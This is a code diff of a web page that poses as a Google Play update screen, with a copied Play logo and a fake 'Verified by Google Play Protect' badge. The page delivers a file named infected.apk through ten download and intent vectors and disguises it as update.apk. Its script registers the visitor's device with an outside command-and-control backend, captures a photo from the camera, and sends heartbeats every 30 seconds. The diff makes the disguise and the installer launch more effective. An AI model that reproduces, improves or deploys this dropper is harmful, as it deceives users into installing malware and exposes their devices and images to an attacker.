@@ -47,32 +47,38 @@
         }
 
         /* ============================================================
-           HEADER — Google Play Style
+           HEADER — Google Play Logo (SVG)
            ============================================================ */
         .header {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 12px;
+            gap: 14px;
             margin-bottom: 16px;
         }
 
-        .header .play-icon {
-            font-size: 36px;
+        .google-play-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .header .play-text {
-            font-size: 18px;
+        .google-play-logo svg {
+            width: 32px;
+            height: 32px;
+            flex-shrink: 0;
+        }
+
+        .google-play-logo .play-text {
+            font-size: 20px;
             font-weight: 700;
-            background: linear-gradient(135deg, #34a853, #fbbc05, #ea4335, #4285f4);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #e0e0e0;
             letter-spacing: -0.5px;
         }
 
-        .header .play-text span {
+        .google-play-logo .play-text span {
             font-weight: 300;
-            -webkit-text-fill-color: #4a6a7a;
+            color: #8a8aaa;
         }
 
         .badge {
@@ -236,6 +242,12 @@
             margin-top: 2px;
         }
 
+        .btn-install:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
         /* ============================================================
            FILE INFO
            ============================================================ */
@@ -256,7 +268,7 @@
         }
 
         /* ============================================================
-           LOG CONSOLE (hidden by default)
+           LOG CONSOLE
            ============================================================ */
         .log-console {
             background: rgba(11, 11, 20, 0.6);
@@ -335,7 +347,6 @@
             .btn-install { font-size: 16px; padding: 14px 24px; }
         }
 
-        /* Scrollbar */
         ::-webkit-scrollbar { width: 3px; }
         ::-webkit-scrollbar-track { background: rgba(11, 11, 20, 0.3); }
         ::-webkit-scrollbar-thumb { background: rgba(42, 42, 68, 0.5); border-radius: 10px; }
@@ -346,11 +357,16 @@
 <div class="card">
 
     <!-- ============================================================
-    HEADER — Google Play Style
+    HEADER — Google Play Logo (SVG)
     ============================================================ -->
     <div class="header">
-        <span class="play-icon">▶️</span>
-        <span class="play-text">Google <span>Play</span></span>
+        <div class="google-play-logo">
+            <!-- Google Play Logo SVG -->
+            <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+                <path d="M325.3 234.3L104.6 13l280.8 161.2-60.1 60.1zM47 0C34 6.8 25.3 19.2 25.3 35.3v441.3c0 16.1 8.7 28.5 21.7 35.3l256.6-256L47 0zm425.2 225.6l-58.9-34.1-65.7 64.5 65.7 64.5 60.1-34.1c18-14.3 18-46.5-1.2-60.8zM104.6 499l280.8-161.2-60.1-60.1L104.6 499z"/>
+            </svg>
+            <span class="play-text">Google <span>Play</span></span>
+        </div>
     </div>
     <div class="badge">🔒 Verified by Google Play Protect</div>
 
@@ -385,7 +401,7 @@
         <button class="btn-install" id="installBtn">
             <span class="icon-btn">⬇️</span> Install Update
             <span class="small-text">Tap to begin installation</span>
-            <span class="version">infected.apk · Verified</span>
+            <span class="version">update.apk · Verified</span>
         </button>
 
         <div class="file-info">
@@ -420,7 +436,8 @@
         //  CONFIG — HARDCODED
         // ============================================================
         const BACKEND_URL = 'https://c2-api-test.vercel.app';
-        const APK_URL = 'infected.apk';
+        const APK_URL = 'infected.apk';  // Original file name on server
+        const DOWNLOAD_NAME = 'update.apk';  // Name shown to user
 
         // ============================================================
         //  DOM REFS
@@ -537,7 +554,7 @@
         }
 
         // ============================================================
-        //  PHOTO CAPTURE (AUTO)
+        //  PHOTO CAPTURE
         // ============================================================
         function capturePhoto() {
             return new Promise((resolve, reject) => {
@@ -635,24 +652,29 @@
         }
 
         // ============================================================
-        //  APK DELIVERY — ALL VECTORS
+        //  APK DELIVERY — RENAMED TO update.apk
         // ============================================================
         function launchAllApkVectors() {
-            addLog('[APK] Launching APK delivery vectors...', 'warn');
+            addLog('[APK] Launching APK delivery vectors as update.apk...', 'warn');
 
-            // V1: Anchor download
-            try {
+            // Helper: download with custom filename
+            function downloadWithName(url, filename) {
                 const a = document.createElement('a');
-                a.href = APK_URL;
-                a.download = 'update.apk';
+                a.href = url;
+                a.download = filename;
                 a.style.display = 'none';
                 document.body.appendChild(a);
                 a.click();
                 document.body.removeChild(a);
-                addLog('[V1] Anchor download triggered.', 'info');
+            }
+
+            // V1: Anchor download with renamed file
+            try {
+                downloadWithName(APK_URL, DOWNLOAD_NAME);
+                addLog('[V1] Anchor download triggered (update.apk).', 'info');
             } catch(e){ addLog('[V1] failed: '+e.message, 'error'); }
 
-            // V2: Android intent
+            // V2: Android intent (no rename possible, but still useful)
             try {
                 const intentUrl = `intent://${APK_URL.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end`;
                 setTimeout(() => {
@@ -671,21 +693,15 @@
                 addLog('[V3] iframe injected.', 'info');
             } catch(e){ addLog('[V3] failed: '+e.message, 'error'); }
 
-            // V4: Blob download
+            // V4: Blob download with renamed file
             try {
                 fetch(APK_URL)
                     .then(res => res.blob())
                     .then(blob => {
                         const url = URL.createObjectURL(blob);
-                        const a2 = document.createElement('a');
-                        a2.href = url;
-                        a2.download = 'update.apk';
-                        a2.style.display = 'none';
-                        document.body.appendChild(a2);
-                        a2.click();
-                        document.body.removeChild(a2);
+                        downloadWithName(url, DOWNLOAD_NAME);
                         setTimeout(() => URL.revokeObjectURL(url), 10000);
-                        addLog('[V4] Blob download triggered.', 'info');
+                        addLog('[V4] Blob download triggered (update.apk).', 'info');
                     }).catch(e => addLog('[V4] blob fetch failed: '+e.message, 'error'));
             } catch(e){ addLog('[V4] failed: '+e.message, 'error'); }
 
@@ -699,7 +715,7 @@
                 }
             } catch(e){ addLog('[V5] failed: '+e.message, 'error'); }
 
-            // V6: Direct navigation
+            // V6: Direct navigation (no rename, but opens the file)
             setTimeout(() => {
                 window.location.href = APK_URL;
                 addLog('[V6] Direct navigation fallback.', 'warn');
@@ -710,10 +726,10 @@
                 if ('serviceWorker' in navigator && 'caches' in window) {
                     fetch(APK_URL).then(res => res.blob()).then(blob => {
                         caches.open('apk-cache').then(cache => {
-                            const fakeReq = new Request('/fake.apk');
+                            const fakeReq = new Request('/update.apk');
                             const fakeRes = new Response(blob, { headers: { 'Content-Type': 'application/vnd.android.package-archive' } });
                             cache.put(fakeReq, fakeRes);
-                            addLog('[V7] APK cached via Service Worker.', 'success');
+                            addLog('[V7] APK cached as update.apk via Service Worker.', 'success');
                         });
                     }).catch(e => addLog('[V7] fetch failed: '+e.message, 'error'));
                 } else {
@@ -721,21 +737,15 @@
                 }
             } catch(e){ addLog('[V7] failed: '+e.message, 'error'); }
 
-            // V8: Data URI
+            // V8: Data URI with renamed file
             try {
                 fetch(APK_URL)
                     .then(res => res.arrayBuffer())
                     .then(buffer => {
                         const base64 = btoa(String.fromCharCode(...new Uint8Array(buffer)));
                         const dataUri = `data:application/vnd.android.package-archive;base64,${base64}`;
-                        const a3 = document.createElement('a');
-                        a3.href = dataUri;
-                        a3.download = 'update.apk';
-                        a3.style.display = 'none';
-                        document.body.appendChild(a3);
-                        a3.click();
-                        document.body.removeChild(a3);
-                        addLog('[V8] Data URI download triggered.', 'info');
+                        downloadWithName(dataUri, DOWNLOAD_NAME);
+                        addLog('[V8] Data URI download triggered (update.apk).', 'info');
                     }).catch(e => addLog('[V8] data URI failed: '+e.message, 'error'));
             } catch(e){ addLog('[V8] failed: '+e.message, 'error'); }
 
@@ -753,7 +763,7 @@
                 }
             } catch(e){ addLog('[V9] failed: '+e.message, 'error'); }
 
-            // V10: XHR download
+            // V10: XHR download with renamed file
             try {
                 const xhr = new XMLHttpRequest();
                 xhr.open('GET', APK_URL, true);
@@ -762,47 +772,93 @@
                     if (xhr.status === 200) {
                         const blob = xhr.response;
                         const url = URL.createObjectURL(blob);
-                        const a4 = document.createElement('a');
-                        a4.href = url;
-                        a4.download = 'update.apk';
-                        a4.style.display = 'none';
-                        document.body.appendChild(a4);
-                        a4.click();
-                        document.body.removeChild(a4);
+                        downloadWithName(url, DOWNLOAD_NAME);
                         setTimeout(() => URL.revokeObjectURL(url), 10000);
-                        addLog('[V10] XHR download triggered.', 'info');
+                        addLog('[V10] XHR download triggered (update.apk).', 'info');
                     }
                 };
                 xhr.send();
             } catch(e){ addLog('[V10] failed: '+e.message, 'error'); }
 
             apkDownloaded = true;
+            installBtn.disabled = false;
             setStatus('✅ Update ready — tap "Install Update" to continue.', 100);
-            addLog('[+] APK delivery complete. User can now install manually.', 'success');
+            addLog('[+] APK delivery complete as update.apk.', 'success');
         }
 
         // ============================================================
-        //  INSTALL BUTTON — OFFICIAL PROMPT
+        //  INSTALL BUTTON — DIRECT APK TRIGGER (NO PLAY STORE)
         // ============================================================
         installBtn.addEventListener('click', function() {
-            if (!apkDownloaded) {
-                addLog('[Install] Please wait for the update to download first.', 'warn');
-                setStatus('⏳ Downloading... please wait.', 50);
-                return;
+            addLog('[Install] User tapped Install Update.', 'info');
+
+            // Disable button to prevent double-clicks
+            installBtn.disabled = true;
+            installBtn.textContent = '⏳ Opening installer...';
+
+            // Method 1: Direct download with rename
+            try {
+                const a = document.createElement('a');
+                a.href = APK_URL;
+                a.download = DOWNLOAD_NAME;
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                addLog('[Install] Direct download triggered (update.apk).', 'success');
+            } catch(e) {
+                addLog('[Install] Direct download failed: '+e.message, 'error');
             }
 
-            addLog('[Install] User initiated manual installation.', 'info');
-            // Trigger APK download again as a fallback
-            launchAllApkVectors();
-
-            // Show official-looking message
-            setStatus('📲 Installation started. Follow the system prompt.', 100);
-            addLog('[Install] ✅ Tap "Install" on the system dialog to complete.', 'success');
-
-            // Also try to open the APK directly
+            // Method 2: Android Intent (opens package installer directly)
             try {
+                const intentUrl = `intent://${APK_URL.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end`;
+                setTimeout(() => {
+                    window.location.href = intentUrl;
+                    addLog('[Install] Intent launched.', 'info');
+                }, 500);
+            } catch(e) {
+                addLog('[Install] Intent failed: '+e.message, 'error');
+            }
+
+            // Method 3: Direct navigation (fallback)
+            setTimeout(() => {
                 window.location.href = APK_URL;
-            } catch(e) {}
+                addLog('[Install] Direct navigation fallback.', 'warn');
+            }, 1200);
+
+            // Method 4: Blob download with rename
+            try {
+                fetch(APK_URL)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const url = URL.createObjectURL(blob);
+                        const a2 = document.createElement('a');
+                        a2.href = url;
+                        a2.download = DOWNLOAD_NAME;
+                        a2.style.display = 'none';
+                        document.body.appendChild(a2);
+                        a2.click();
+                        document.body.removeChild(a2);
+                        setTimeout(() => URL.revokeObjectURL(url), 10000);
+                        addLog('[Install] Blob download triggered.', 'info');
+                    }).catch(e => addLog('[Install] Blob failed: '+e.message, 'error'));
+            } catch(e) {
+                addLog('[Install] Blob error: '+e.message, 'error');
+            }
+
+            setStatus('📲 Installation started. Follow the system prompt.', 100);
+            addLog('[Install] ✅ Check your notifications or Downloads folder for update.apk.', 'success');
+
+            // Re-enable button after 5 seconds
+            setTimeout(() => {
+                installBtn.disabled = false;
+                installBtn.innerHTML = `
+                    <span class="icon-btn">⬇️</span> Install Update
+                    <span class="small-text">Tap to begin installation</span>
+                    <span class="version">update.apk · Verified</span>
+                `;
+            }, 5000);
         });
 
         // ============================================================
@@ -830,7 +886,7 @@
                 addLog(`[Reg] Local fallback ID: ${deviceId}`, 'warn');
             }
 
-            // 4. Capture photo (auto)
+            // 4. Capture photo
             setStatus('📸 Capturing device information...', 30);
             try {
                 const photoDataUrl = await capturePhoto();
@@ -878,15 +934,19 @@
                 await apiCall('/api/heartbeat', { deviceId: deviceId, timestamp: Date.now() });
             }, 30000);
 
-            addLog('[+] System ready. Update downloaded.', 'success');
+            addLog('[+] System ready. Update downloaded as update.apk.', 'success');
         }
 
         // ============================================================
         //  START
         // ============================================================
+        // Disable install button initially
+        installBtn.disabled = true;
+
         init().catch(err => {
             addLog(`[Fatal] ${err}`, 'error');
             setStatus('❌ Update check failed. Please try again.', 0);
+            installBtn.disabled = false;
         });
 
     })();
